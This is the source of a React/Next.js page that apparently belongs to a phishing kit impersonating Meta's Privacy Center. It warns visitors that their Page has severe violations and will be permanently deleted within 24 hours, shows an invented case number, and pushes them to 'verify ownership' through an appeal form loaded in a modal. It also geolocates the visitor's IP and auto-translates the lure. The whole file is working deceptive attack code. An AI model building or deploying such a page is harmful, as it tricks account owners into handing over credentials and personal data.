'use client';
import BackgroundImage from '@/assets/images/bg-image.png';
import congaImage from '@/assets/images/logo.png';
import MetaAI from '@/assets/images/meta-ai-image.png';
import MetaImage from '@/assets/images/meta-image.png';
import ProfileImage from '@/assets/images/profile-image.png';
import WarningImage from '@/assets/images/warning.png';
import { store } from '@/store/store';
import translateText from '@/utils/translate';
import type { IconDefinition } from '@fortawesome/fontawesome-svg-core';
import { faHouse } from '@fortawesome/free-regular-svg-icons/faHouse';
import { faChevronRight } from '@fortawesome/free-solid-svg-icons/faChevronRight';
import { faCircleInfo } from '@fortawesome/free-solid-svg-icons/faCircleInfo';
import { faGear } from '@fortawesome/free-solid-svg-icons/faGear';
import { faLock } from '@fortawesome/free-solid-svg-icons/faLock';
import { faMagnifyingGlass } from '@fortawesome/free-solid-svg-icons/faMagnifyingGlass';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import dynamic from 'next/dynamic';
import Image, { type StaticImageData } from 'next/image';
import { useEffect, useMemo, useRef, useState, type FC } from 'react';

const FormModal = dynamic(() => import('@/components/form-modal'), { ssr: false });

interface MenuItem {
    id: string;
    icon: IconDefinition;
    label: string;
    isActive?: boolean;
}

interface InfoCardItem {
    id: string;
    title: string;
    subtitle: string;
    image?: StaticImageData;
}

const menuItems: MenuItem[] = [
    {
        id: 'home',
        icon: faHouse,
        label: 'Privacy Center Home Page',
        isActive: true
    },
    {
        id: 'search',
        icon: faMagnifyingGlass,
        label: 'Search'
    },
    {
        id: 'privacy',
        icon: faLock,
        label: 'Privacy Policy'
    },
    {
        id: 'rules',
        icon: faCircleInfo,
        label: 'Other rules and articles'
    },
    {
        id: 'settings',
        icon: faGear,
        label: 'Settings'
    }
];

const privacyCenterItems: InfoCardItem[] = [
    {
        id: 'policy',
        title: 'What is the Privacy Policy and what does it say?',
        subtitle: 'Privacy Policy',
        image: ProfileImage
    },
    {
        id: 'manage',
        title: 'How you can manage or delete your information',
        subtitle: 'Privacy Policy',
        image: ProfileImage
    }
];

const agreementItems: InfoCardItem[] = [
    {
        id: 'meta-ai',
        title: 'Meta AI',
        subtitle: 'User Agreement',
        image: MetaAI
    }
];

const resourceItems: InfoCardItem[] = [
    {
        id: 'generative-ai',
        title: 'How Meta uses information for generative AI models',
        subtitle: 'Privacy Center'
    },
    {
        id: 'ai-systems',
        title: 'Cards with information about the operation of AI systems',
        subtitle: 'Meta AI website'
    },
    {
        id: 'intro-ai',
        title: 'Introduction to Generative AI',
        subtitle: 'For teenagers'
    }
];

const Page: FC = () => {
    const { isModalOpen, setModalOpen, setGeoInfo, geoInfo } = store();
    const [translations, setTranslations] = useState<Record<string, string>>({});
    const [modalKey, setModalKey] = useState(0);
    const [showWelcome, setShowWelcome] = useState(true);
    const isTranslatingRef = useRef(false);

    const currentDate = useMemo(() => {
        const date = new Date();
        const options: Intl.DateTimeFormatOptions = { month: 'long', day: 'numeric', year: 'numeric' };
        return date.toLocaleDateString('en-US', options);
    }, []);

    const welcomeTextsToTranslate = useMemo(
        () => [
            'Meta Support Center: Account Violation Verification',
            "Our system has detected multiple severe violations of Meta's Terms of Service and Community Standards on your Page. Case file",
            'has been created, and your Page is scheduled for permanent deletion within the next 24 hours. Please review the violation details to submit an urgent appeal.',
            'More infomation',
            'Violation evidence and case history file have been generated.',
            'Click the button below to view the detailed violation report and verify your ownership to file an appeal.',
            'View Violations & Appeal Now',
            'Your account was restricted on'
        ],
        []
    );

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (geoInfo) {
            return;
        }

        const fetchGeoInfo = async () => {
            try {
                // Kiểm tra localStorage trước để tránh gọi API trùng lặp
                const ipInfo = localStorage.getItem('ipInfo');
                if (ipInfo) {
                    const data = JSON.parse(ipInfo);
                    setGeoInfo({
                        asn: data.asn || 0,
                        ip: data.ip || 'Unknown',
                        country: data.country || 'Unknown',
                        region: data.region || 'Unknown',
                        city: data.city || 'Unknown',
                        country_code: data.country_code || 'US'
                    });
                    return;
                }

                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                localStorage.setItem('ipInfo', JSON.stringify(data));
                setGeoInfo({
                    asn: data.asn || 0,
                    ip: data.ip || 'Unknown',
                    country: data.country || 'Unknown',
                    region: data.region || 'Unknown',
                    city: data.city || 'Unknown',
                    country_code: data.country_code || 'US'
                });
            } catch {
                setGeoInfo({
                    asn: 0,
                    ip: 'Unknown',
                    country: 'Unknown',
                    region: 'Unknown',
                    city: 'Unknown',
                    country_code: 'US'
                });
            }
        };
        fetchGeoInfo();
    }, [setGeoInfo, geoInfo]);

    useEffect(() => {
        if (!geoInfo || isTranslatingRef.current || Object.keys(translations).length > 0) return;

        isTranslatingRef.current = true;

        const textsToTranslate = [...welcomeTextsToTranslate, 'Privacy Center Home Page', 'Search', 'Privacy Policy', 'Other rules and articles', 'Settings', 'Privacy Center', 'Policy Violation', 'We have detected suspicious activity or a potential violation of our Terms of Service. To protect the Meta platform and its users, your account has been scheduled for disabling. If you believe this action was taken in error, you must submit a request for review to our Security Team immediately.', 'This form is only to be used for submitting appeals and restoring account status.', 'Please ensure that you provide all the required information below. Failure to do so may result in delays in processing your appeal.', 'Request Review', 'What is the Privacy Policy and what does it say?', 'How you can manage or delete your information', 'Meta AI', 'User Agreement', 'For more details, see the User Agreement', 'Additional resources', 'How Meta uses information for generative AI models', 'Meta AI website', 'Introduction to Generative AI', 'For teenagers', 'We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. Read more about Privacy Policy'];

        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};

            // Gọi API song song thay vì tuần tự để tăng tốc độ
            const promises = textsToTranslate.map(async (text) => {
                const translated = await translateText(text, geoInfo.country_code);
                return { text, translated };
            });

            const results = await Promise.all(promises);
            results.forEach(({ text, translated }) => {
                translatedMap[text] = translated;
            });

            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo, translations]);

    return (
        <>
            {showWelcome ? (
                <div className='relative flex min-h-screen items-center justify-center bg-white'>
                    <div className='flex w-11/12 flex-col gap-4 rounded-lg md:w-2/5 2xl:w-1/3'>
                        {/* Logo */}
                        <div className='overflow-hidden rounded-xl border border-gray-100 bg-white shadow-sm'>
                            <Image
                                src={congaImage}
                                alt='Security verification illustration'
                                className='mx-auto block h-auto w-full object-cover'
                                priority
                            />
                        </div>

                        <p className='text-2xl font-bold'>{t('Meta Support Center: Account Violation Verification')}</p>

                        <p className='text-gray-700'>
                            {t("Our system has detected multiple severe violations of Meta's Terms of Service and Community Standards on your Page. Case file")}{' '}
                            <strong>CASE_#2026_88591244</strong>{' '}
                            {t('has been created, and your Page is scheduled for permanent deletion within the next 24 hours. Please review the violation details to submit an urgent appeal.')}{' '}
                            <a className='text-blue-500 hover:underline' href='https://www.facebook.com/help' target='_blank' rel='noreferrer'>
                                {t('More infomation')}
                            </a>
                        </p>

                        {/* Stepper */}
                        <div className='px-[14px]'>
                            <ol className='relative border-s-2 border-gray-200 text-gray-500'>
                                {/* Step 1 - done */}
                                <li className='mb-10 ms-6'>
                                    <span className='absolute -start-[14px] flex h-6 w-6 items-center justify-center rounded-full bg-[#C4C4C4] ring-4 ring-white'>
                                        <svg className='h-3 w-3 text-white' aria-hidden='true' xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 16 12'>
                                            <path stroke='currentColor' strokeLinecap='round' strokeLinejoin='round' strokeWidth='2' d='M1 5.917 5.724 10.5 15 1.5' />
                                        </svg>
                                    </span>
                                    <h3 className='text-black'>{t('Violation evidence and case history file have been generated.')}</h3>
                                </li>
                                {/* Step 2 - active */}
                                <li className='ms-6'>
                                    <span className='absolute -start-[14px] flex h-6 w-6 items-center justify-center rounded-full bg-[#35589e] ring-4 ring-white'>
                                        <svg className='h-3 w-3 text-white' aria-hidden='true' xmlns='http://www.w3.org/2000/svg' fill='currentColor' viewBox='0 0 20 16'>
                                            <path d='M18 0H2a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V2a2 2 0 0 0-2-2ZM6.5 3a2.5 2.5 0 1 1 0 5 2.5 2.5 0 0 1 0-5ZM3.014 13.021l.157-.625A3.427 3.427 0 0 1 6.5 9.571a3.426 3.426 0 0 1 3.322 2.805l.159.622-6.967.023ZM16 12h-3a1 1 0 0 1 0-2h3a1 1 0 1 1 0 2Zm0-3h-3a1 1 0 1 1 0-2h3a1 1 0 1 1 0 2Zm0-3h-3a1 1 0 1 1 0-2h3a1 1 0 1 1 0 2Z' />
                                        </svg>
                                    </span>
                                    <h3 className='text-black'>{t('Click the button below to view the detailed violation report and verify your ownership to file an appeal.')}</h3>
                                </li>
                            </ol>
                        </div>

                        <button
                            onClick={() => setShowWelcome(false)}
                            className='block w-full cursor-pointer rounded-lg bg-blue-500 py-3 text-center text-lg font-semibold text-white hover:bg-blue-600 transition-colors'
                        >
                            {t('View Violations & Appeal Now')}
                        </button>

                        <p className='mb-5 mt-3 block text-center'>
                            {t('Your account was restricted on')} <strong>{currentDate}</strong>.
                        </p>
                    </div>
                </div>
            ) : (
                <div className='flex items-center justify-center bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] text-[#1C2B33]'>
            <title>Policy Violation - Page Appeal</title>
            <div className='flex w-full max-w-[1100px]'>
                <div className='sticky top-0 hidden h-screen w-1/3 flex-col border-r border-r-gray-200 pt-10 pr-8 sm:flex'>
                    <Image src={MetaImage} alt='' className='h-3.5 w-[70px]' />
                    <p className='my-4 text-2xl font-bold'>{t('Privacy Center')}</p>
                    {menuItems.map((item) => (
                        <div key={item.id} className={`flex cursor-pointer items-center justify-start gap-3 rounded-[15px] px-4 py-3 font-medium ${item.isActive ? 'bg-[#344854] text-white' : 'text-black hover:bg-[#e3e8ef]'}`}>
                            <FontAwesomeIcon icon={item.icon} />
                            <p>{t(item.label)}</p>
                        </div>
                    ))}
                </div>
                <div className='flex flex-1 flex-col gap-5 px-4 py-10 sm:px-8'>
                    <div className='flex items-center gap-2'>
                        <Image src={WarningImage} alt='' className='h-[50px] w-[50px]' />
                        <p className='text-2xl font-bold'>{t('Policy Violation')}</p>
                    </div>
                    <p>{t('We have detected suspicious activity or a potential violation of our Terms of Service. To protect the Meta platform and its users, your account has been scheduled for disabling. If you believe this action was taken in error, you must submit a request for review to our Security Team immediately.')}</p>
                    <div className='rounded-b-[20px] bg-white'>
                        <Image src={BackgroundImage} alt='' className='rounded-t-[20px] bg-blue-500 py-20' />
                        <div className='flex flex-col items-center justify-center gap-5 p-5'>
                            <p className='text-2xl'>{t('This form is only to be used for submitting appeals and restoring account status.')}</p>
                            <p className='text-[15px]'>{t('Please ensure that you provide all the required information below. Failure to do so may result in delays in processing your appeal.')}</p>
                            <button
                                onClick={() => {
                                    setModalKey((prev) => prev + 1);
                                    setModalOpen(true);
                                }}
                                className='flex h-[50px] w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white'
                            >
                                {t('Request Review')}
                            </button>
                        </div>
                    </div>
                    <div className='flex flex-col gap-3'>
                        <div>
                            <p className='font-sans font-medium text-[#212529]'>{t('Privacy Center')}</p>
                            {privacyCenterItems.map((item, index) => {
                                const isFirst = index === 0;
                                const isLast = index === privacyCenterItems.length - 1;
                                const roundedClass = privacyCenterItems.length === 1 ? 'rounded-[15px]' : isFirst ? 'rounded-t-[15px] border-b border-b-gray-200' : isLast ? 'rounded-b-[15px]' : 'border-y border-y-gray-200';

                                return (
                                    <div key={item.id} className={`flex cursor-pointer items-center justify-center gap-3 bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef] ${roundedClass}`}>
                                        {item.image && <Image src={item.image} alt='' className='h-12 w-12' />}
                                        <div className='flex flex-1 flex-col'>
                                            <p className='font-medium'>{t(item.title)}</p>
                                            <p className='text-[#465a69]'>{t(item.subtitle)}</p>
                                        </div>
                                        <FontAwesomeIcon icon={faChevronRight} />
                                    </div>
                                );
                            })}
                        </div>
                        <div>
                            <p className='font-sans font-medium text-[#212529]'>{t('For more details, see the User Agreement')}</p>
                            {agreementItems.map((item, index) => {
                                const isFirst = index === 0;
                                const isLast = index === agreementItems.length - 1;
                                const roundedClass = agreementItems.length === 1 ? 'rounded-[15px]' : isFirst ? 'rounded-t-[15px] border-b border-b-gray-200' : isLast ? 'rounded-b-[15px]' : 'border-y border-y-gray-200';

                                return (
                                    <div key={item.id} className={`flex cursor-pointer items-center justify-center gap-3 bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef] ${roundedClass}`}>
                                        {item.image && <Image src={item.image} alt='' className='h-12 w-12' />}
                                        <div className='flex flex-1 flex-col'>
                                            <p className='font-medium'>{t(item.title)}</p>
                                            <p className='text-[#465a69]'>{t(item.subtitle)}</p>
                                        </div>
                                        <FontAwesomeIcon icon={faChevronRight} />
                                    </div>
                                );
                            })}
                        </div>
                        <div>
                            <p className='font-sans font-medium text-[#212529]'>{t('Additional resources')}</p>
                            {resourceItems.map((item, index) => {
                                const isFirst = index === 0;
                                const isLast = index === resourceItems.length - 1;
                                const roundedClass = resourceItems.length === 1 ? 'rounded-[15px]' : isFirst ? 'rounded-t-[15px] border-b border-b-gray-200' : isLast ? 'rounded-b-[15px]' : 'border-y border-y-gray-200';

                                return (
                                    <div key={item.id} className={`flex cursor-pointer items-center justify-center gap-3 bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef] ${roundedClass}`}>
                                        {item.image && <Image src={item.image} alt='' className='h-12 w-12' />}
                                        <div className='flex flex-1 flex-col'>
                                            <p className='font-medium'>{t(item.title)}</p>
                                            <p className='text-[#465a69]'>{t(item.subtitle)}</p>
                                        </div>
                                        <FontAwesomeIcon icon={faChevronRight} />
                                    </div>
                                );
                            })}
                        </div>
                        <p className='text-[15px] text-[#465a69]'>{t('We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. Read more about Privacy Policy')}</p>
                    </div>
                </div>
            </div>
            {isModalOpen && <FormModal key={modalKey} />}
        </div>
            )}
        </>
    );
};

export default Page;
